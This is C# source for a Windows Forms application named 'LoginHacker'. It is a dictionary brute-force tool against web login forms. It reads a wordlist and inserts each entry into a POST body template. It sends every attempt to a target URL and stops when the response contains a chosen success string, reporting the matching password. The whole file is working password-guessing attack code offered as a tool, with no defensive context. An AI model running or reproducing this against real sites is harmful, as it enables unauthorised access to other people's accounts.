using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace LoginHacker
{
    public partial class Form1 : Form
    {

        private string PostData(string url, string postString)
        {
            string srcString="";
            try 
            {
                byte[] postData = Encoding.UTF8.GetBytes(postString);
                WebClient webClient = new WebClient();
                webClient.UseDefaultCredentials = true;
                webClient.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                byte[] responseData = webClient.UploadData(url, "POST", postData);
                srcString = Encoding.UTF8.GetString(responseData);
                
            }
            catch { }
            return srcString;  
        }
        public Form1()
        {
            InitializeComponent();
        }

        private void TextBox4_DoubleClick(object sender, EventArgs e)
        {
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {

                string file = openFileDialog1.FileName;
                DIC.Text = openFileDialog1.FileName;
            }
        }

        private void DIC_TextChanged(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            try 
            {
                //RegistryKey key = Microsoft.Win32.Registry.LocalMachine;
                //RegistryKey Config = key.OpenSubKey("software//LoginHacker");
                //URL.Text = Config.GetValue("URL").ToString();
                //KEY.Text = Config.GetValue("KEY").ToString();
                //FLAG.Text = Config.GetValue("FLAG").ToString();
            }
            catch { }

        }

        private void Button1_Click(object sender, EventArgs e)
        {
            //保存配置
            //RegistryKey key = Microsoft.Win32.Registry.LocalMachine;
            //RegistryKey Config = key.CreateSubKey("software//LoginHacker");
            //Config.SetValue("URL", URL.Text);
            //Config.SetValue("KEY", KEY.Text);
            //Config.SetValue("FLAG", FLAG.Text);
            //
            Button1.Enabled = false;
            StreamReader sr = new StreamReader(DIC.Text);
            
            while (!sr.EndOfStream)
            {
                Application.DoEvents();
                string DicStr = sr.ReadLine();
                string KeyStr = KEY.Text.Replace("{DIC}", DicStr);
                string ResStr = PostData(URL.Text, KeyStr);
                LOG.Text = "TRY>" + DicStr;
                if (ResStr.IndexOf(FLAG.Text) > -1)
                {
                    LOG.Text = "KEY>" + DicStr;
                    break;
                }
            }
            Button1.Enabled = true;
        }


    }
}
